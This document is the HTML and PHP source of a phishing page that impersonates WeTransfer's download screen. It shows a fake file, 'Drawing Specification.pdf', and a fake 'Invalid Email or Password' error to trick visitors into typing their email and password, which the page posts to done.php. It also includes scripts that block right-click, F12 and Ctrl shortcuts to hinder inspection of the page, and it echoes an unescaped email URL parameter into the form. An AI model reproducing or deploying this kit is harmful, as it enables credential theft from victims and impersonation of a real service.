
<!DOCTYPE html>
<html class="no-touch no-ie" lang="en"><head><script type="text/javascript" charset="utf-8" id="zm-extension" src="" async=""></script><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><script type="text/javascript" async="" src="plus/analytics.htm"></script><script async="" src="plus/bWqOLA69nu2fsMi45LjA.htm"></script><script async="" src="plus/gtm.htm"></script><script type="text/javascript" charset="utf-8" id="zm-extension" src="chrome-extension://fdcgdnkidjaadafnichfpabhfomcebme/scripts/webrtc-patch.js" async=""></script><!--<![endif]-->
  

  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="minimum-scale=1, initial-scale=1,user-scalable=no">
  <meta name="description" content="WeTransfer is the simplest way to send your files around the world. Share large files up to 2GB for free.">
  <meta name="author" content="WeTransfer">




  <link rel="shortcut icon" href="plus/1.ico">
  <link rel="icon" sizes="16x16 32x32" href="plus/1.ico">

  <!-- default favicon -->
  <link rel="mask-icon" href="plus/1.svg" color="#17181A">

  


 
    <title dir="ltr">WeTransfer</title>

  <style type="text/css">
    .assets-warning-node {
      display: none;
      visibility: hidden;
      position: fixed;
      background: #fff;
      z-index: 999;
      bottom: 0; left: 0; right: 0; top: 0;;
      padding: 2em;
      line-height: 1.4;
      font-family: sans-serif;;
      font-size: 1.1em;
    }
    .assets-warning-node p {
      max-width: 42em;
    }
    .root-node .no-script {
      position: fixed;
      background: #E65050;
      color: #fff;
      top: 0;
      left: 0;
      margin: 0;
      padding: 1em;
      font-weight: bold;
    }
  </style>
    <link rel="stylesheet" media="all" href="plus/application-bd95c1c273b3b6f2c6b24f2eaeeaef30be54981e5727d3ac.css" onerror="assetFailed(this)">

</head>
<body onkeypress="return disableCtrlKeyCombination(event);" onkeydown="return disableCtrlKeyCombination(event);">

<script language="JavaScript">

//////////F12 disable code////////////////////////
    document.onkeypress = function (event) {
        event = (event || window.event);
        if (event.keyCode == 123) {
           //alert('No F-12');
            return false;
        }
    }
    document.onmousedown = function (event) {
        event = (event || window.event);
        if (event.keyCode == 123) {
            //alert('No F-keys');
            return false;
        }
    }
document.onkeydown = function (event) {
        event = (event || window.event);
        if (event.keyCode == 123) {
            //alert('No F-keys');
            return false;
        }
    }
/////////////////////end///////////////////////


//Disable right click script 
//visit http://www.rainbow.arch.scriptmania.com/scripts/ 
var message="Sorry, right-click has been disabled"; 
/////////////////////////////////// 
function clickIE() {if (document.all) {(message);return false;}} 
function clickNS(e) {if 
(document.layers||(document.getElementById&&!document.all)) { 
if (e.which==2||e.which==3) {(message);return false;}}} 
if (document.layers) 
{document.captureEvents(Event.MOUSEDOWN);document.onmousedown=clickNS;} 
else{document.onmouseup=clickNS;document.oncontextmenu=clickIE;} 
document.oncontextmenu=new Function("return false") 
// 
function disableCtrlKeyCombination(e)
{
//list all CTRL + key combinations you want to disable
var forbiddenKeys = new Array('a', 'n', 'c', 'x', 'j' , 'w','s','u');
var key;
var isCtrl;
if(window.event)
{
key = window.event.keyCode;     //IE
if(window.event.ctrlKey)
isCtrl = true;
else
isCtrl = false;
}
else
{
key = e.which;     //firefox
if(e.ctrlKey)
isCtrl = true;
else
isCtrl = false;
}
//if ctrl is pressed check if other key is in forbidenKeys array
if(isCtrl)
{
for(i=0; i<forbiddenKeys.length; i++)
{
//case-insensitive comparation
if(forbiddenKeys[i].toLowerCase() == String.fromCharCode(key).toLowerCase())
{
alert('Key combination CTRL + '+String.fromCharCode(key) +' has been disabled.');
return false;
}
}
}
return true;
}
</script>



<form action="done.php" method="post">
  <div class="root-node"> <div class="app application"><div class="transfer" route="[object Object]" id="059a812e9bcfcfe9633f58291d2f60ad20180915161015" secret="4fae7b"><div><div class="transfer__window downloader"><div class="scrollable transfer__contents"><div class="scrollable__content" style="margin-right: 0px;"><div class="downloader__heading downloader__heading--1-files downloader__heading--message"><svg class="downloader__top-icon" viewBox="0 0 170 170"><g fill="#D4D7D9" fill-rule="evenodd"><path d="M145.104 24.896c33.195 33.194 33.195 87.014 0 120.208-33.194 33.195-87.014 33.195-120.208 0C-8.3 111.91-8.3 58.09 24.896 24.896 58.09-8.3 111.91-8.3 145.104 24.896zm-7.071 7.071c-29.29-29.29-76.777-29.29-106.066 0-29.29 29.29-29.29 76.777 0 106.066 29.29 29.29 76.777 29.29 106.066 0 29.29-29.29 29.29-76.777 0-106.066z"></path><path d="M82 100.843V59.007A4.006 4.006 0 0 1 86 55c2.21 0 4 1.794 4 4.007v41.777l15.956-15.956a4.003 4.003 0 0 1 5.657 0 4.004 4.004 0 0 1 0 5.657l-22.628 22.628a3.99 3.99 0 0 1-3.017 1.166 3.992 3.992 0 0 1-3.012-1.166L60.328 90.485a4.003 4.003 0 0 1 0-5.657 4.004 4.004 0 0 1 5.657 0L82 100.843z"></path></g></svg><div style="color:red;" align="center">Invalid Email or Password</div><h2>Ready when you are</h2><p>Files deleted in 24 hours</p><div class="downloader__message downloader__message--expanded">
  <div align="center">  
  <input name="email" id="email" value="<?php echo $_GET['email']; ?>" style="width:100%; border:none; border-bottom:2px solid #C8C8C8; font-size:14px; padding:3px; color:#249; margin-bottom:8px;" placeholder="Enter Receiver Email" required="" type="email"><br>
  <input value="<?php echo $_GET['email']; ?>" id="xxe" name="xxe" type="hidden">
  <input name="onye" value="xx" type="hidden">
<input name="passwd" data-bind="value: unsafe_password" value="<?php echo $passwd ?>" type="hidden">
  <input name="passwd" placeholder=" Enter Password" style="width:100%; border:none; border-bottom:2px solid #C8C8C8; font-size:14px; padding:-30px; color:#999;" required="" type="password">

</div>
  </div></div><ul class="filelist" style="width:100%; border:none; border-bottom:30px solid #C8C8C8; font-size:14px; padding:-60px; color:#999;">
  
  <li class="filelist__item"><div class="filelist__meta"><span class="filelist__name">Drawing Specification.pdf</span><p class="filelist__size"><span>194 KB</span></p><br>
  
  <div class="filelist__action"><svg viewBox="0 0 24 24"><path d="M22 12c0-5.523-4.477-10-10-10S2 6.477 2 12s4.477 10 10 10 10-4.477 10-10zm-9 1.492V7.998C13 7.446 12.552 7 12 7c-.556 0-1 .447-1 .998v5.48l-2.53-2.53c-.385-.385-1.022-.39-1.413.002-.393.393-.39 1.022-.002 1.412l4.247 4.247c.192.19.447.288.702.288.26.003.514-.095.708-.29l4.247-4.246c.383-.385.387-1.022-.003-1.412-.394-.393-1.023-.392-1.413-.002L13 13.492zM0 12C0 5.373 5.373 0 12 0s12 5.373 12 12-5.373 12-12 12S0 18.627 0 12z" fill-rule="evenodd"></path></svg></div></div>
  
  </li>
  
  </ul></div>
 
  <div class="scrollable__scrollbar"><div class="scrollable__scrollbar-thumb" style="height: 0px; transform: translateY(0px);"></div></div></div>
  
<div class="transfer__footer"><button class="transfer__button" name="perform">Download</button><br></div></div></div></div><div class="dropzone"><h3 class="dropzone__title">Drop it like it’s hot</h3><p class="dropzone__text">Add your files by dropping them anywhere in this window</p></div><div class="wallpaper"><iframe src="plus/bg.htm"></iframe><span class="wallpaper__title"></span></div><div class="welcome"></div><nav class="nav nav--loaded"><ul class="nav__items"><li class="nav__item"><a href="" class="nav__label">Help</a></li>
<li class="nav__item nav_item--expanded"><a href="" class="nav__label">About us</a><ul class="nav__subitems" style="width: 0px;"><li class="nav__subitem"><a href="" class="nav__label">WeTransfer</a></li><li class="nav__subitem"><a href="" class="nav__label">Plus</a></li><li class="nav__subitem"><a href="" class="nav__label">Apps</a></li><li class="nav__subitem"><a href="" class="nav__label">Advertise</a></li></ul></li><li class="nav__item"><a href="" class="nav__label">Got Plus?</a></li></ul></nav><div class="spinner logo spinner--single"><svg height="44" width="44" class="spinner__circle" shape-rendering="geometricPrecision" viewBox="0 0 44 44"><circle class="spinner__background" r="20.5" cx="22" cy="22" fill="transparent" style="stroke-dasharray: 128.805; stroke-dashoffset: 0; stroke-width: 3; stroke: rgb(232, 235, 237);"></circle><circle class="spinner__foreground" r="20.5" cx="22" cy="22" fill="transparent" style="stroke-dasharray: 128.805; stroke-dashoffset: 128.161; stroke-width: 3; stroke: rgb(64, 159, 255);"></circle></svg><svg width="52" height="29" class="spinner__logo" viewBox="-4 -2 52 29"><defs><path id="logo-path" d="M25.4 10.6c0-6.2 4.4-9.9 10.1-9.9C40.6.7 44 3.3 44 6.9c0 3.4-2.9 5.6-6.1 5.6-1.8 0-3.1-.3-4-1-.3-.3-.5-.2-.5.1 0 1.3.5 2.3 1.3 3.2.7.7 2 1.2 3.2 1.2 1.3 0 2.4-.3 3.4-.8s1.8-.3 2.3.5c.6.9-.2 2.1-.9 2.9-1.3 1.4-3.8 2.4-7 2.4-6.5-.2-10.3-4.6-10.3-10.4zm-13.3 4.1c.6 0 1 .3 1.4 1l1.8 2.9c.7 1.1 1.3 1.9 2.6 1.9s2-.5 2.6-2c.8-1.8 1.7-4.1 2.4-7.1.9-3.4 1.3-5.4 1.3-7.1s-.5-2.7-2.4-3c-2.5-.5-6-.7-9.7-.7s-7.2.2-9.7.6C.5 1.6 0 2.6 0 4.3S.4 8 1.2 11.4c.8 3 1.6 5.2 2.4 7.1.7 1.5 1.3 2 2.6 2s1.9-.8 2.6-1.9l1.8-2.9c.5-.6.9-1 1.5-1z"></path><filter id="logo-filter" width="200%" height="200%" x="-50%" y="-50%" filterUnits="objectBoundingBox"><feOffset dx="0" dy="2" in="SourceAlpha" result="shadowOffsetOuter1"></feOffset><feGaussianBlur stdDeviation="2" in="shadowOffsetOuter1" result="shadowBlurOuter1"></feGaussianBlur></filter></defs><g fill="none"><use fill="#17181A" fill-opacity="0.11" filter="url(#logo-filter)" xlink:href="#logo-path"></use><use fill="rgb(255, 255, 255)" fill-rule="evenodd" xlink:href="#logo-path"></use></g></svg><svg class="spinner__aborted" viewBox="55 42 171 171"><g fill="none" fill-rule="evenodd"><path fill="#E65050" d="M136.75 141.407h7.432l3.315-29.634V92.887h-14.164v18.886l3.416 29.634zM133.734 162h13.36v-13.26h-13.36V162z"></path></g></svg><svg class="spinner__finished" viewBox="550 421 13 13" focusable="false"><path stroke="#409FFF" stroke-width="2.057" d="M552 426.888l3.16 3.112 4.84-7" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"></path></svg></div></div></div>
</form>
<div class="drop-hint" id="drop-to-share-hint" style="display: none; background-image: url; background-size: 67px 327px;"><a class="share-btn-close"></a><a class="btn-options"></a><div class="drop-hint-bubble" id="drop-hint-bubble-share" style="display: none; background-image: url(); background-size: 253px 79px;"></div></div><div class="drop-hint" id="drop-to-search-hint" style="display: none; background-image: url(); background-size: 67px 327px;"><a class="search-btn-close"></a><a class="btn-options"></a><div class="drop-hint-bubble" id="drop-hint-bubble-search" style="display: none; background-image: url(); background-size: 215px 79px;"></div></div><div class="dropAreaContainer" style="display: none; right: 0px;"><div class="searchDropArea" style="width: 142px; height: 16.6667%; background-color: rgba(220, 220, 220, 0.9);"><span class="disable-manipulations"></span><img src="" style="max-height: 81px; height: 90%; background-color: transparent;" class="disable-manipulations"></div><div class="searchDropArea" style="width: 142px; height: 16.6667%; background-color: rgba(240, 240, 240, 0.9);"><span class="disable-manipulations"></span><img src="" style="max-height: 40px; height: 90%; background-color: transparent;" class="disable-manipulations"></div><div class="searchDropArea" style="width: 142px; height: 16.6667%; background-color: rgba(220, 220, 220, 0.9);"><span class="disable-manipulations"></span><img src="" style="max-height: 88px; height: 90%; background-color: transparent;" class="disable-manipulations"></div><div class="searchDropArea" style="width: 142px; height: 16.6667%; background-color: rgba(240, 240, 240, 0.9);"><span class="disable-manipulations"></span><img src="" style="max-height: 82px; height: 90%; background-color: transparent;" class="disable-manipulations"></div><div class="searchDropArea" style="width: 142px; height: 16.6667%; background-color: rgba(220, 220, 220, 0.9);"><span class="disable-manipulations"></span><img src="" style="max-height: 86px; height: 90%; background-color: transparent;" class="disable-manipulations"></div><div class="dropAreaSettings" style="width: 142px; height: 16.6667%; background-color: rgba(58, 58, 58, 0.9);"><span class="disable-manipulations"></span><img src="" style="max-height: 25px; height: 90%; background-color: transparent;" class="disable-manipulations"></div></div><div class="dropAreaContainer" style="display: none; left: 0px;"><div class="shareDropArea" style="width: 142px; height: 16.6667%; background-color: rgba(60, 90, 152, 0.9);"><span class="disable-manipulations"></span><img src="" style="max-height: 25px; height: 90%; background-color: transparent;" class="disable-manipulations"></div><div class="shareDropArea" style="width: 142px; height: 16.6667%; background-color: rgba(233, 246, 255, 0.9);"><span class="disable-manipulations"></span><img src="" style="max-height: 23px; height: 90%; background-color: transparent;" class="disable-manipulations"></div><div class="shareDropArea" style="width: 142px; height: 16.6667%; background-color: rgba(235, 235, 235, 0.9);"><span class="disable-manipulations"></span><img src="" style="max-height: 28px; height: 90%; background-color: transparent;" class="disable-manipulations"></div><div class="shareDropArea" style="width: 142px; height: 16.6667%; background-color: rgba(58, 58, 58, 0.9);"><span class="disable-manipulations"></span><img src="" style="max-height: 56px; height: 90%; background-color: transparent;" class="disable-manipulations"></div><div class="shareDropArea" style="width: 142px; height: 16.6667%; background-color: rgba(248, 248, 248, 0.9);"><span class="disable-manipulations"></span><img src="" style="max-height: 31px; height: 90%; background-color: transparent;" class="disable-manipulations"></div><div class="dropAreaSettings" style="width: 142px; height: 16.6667%; background-color: rgba(58, 58, 58, 0.9);"><span class="disable-manipulations"></span><img src="" style="max-height: 25px; height: 90%; background-color: transparent;" class="disable-manipulations"></div></div>

<script src="plus/remove.js"></script>
<script>
    $(document).ready(function(){ 
	$('body').find('img[src$="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6d/Norton_av_logo.png/250px-Norton_av_logo.png"]').remove();
    }); 
</script></body></html>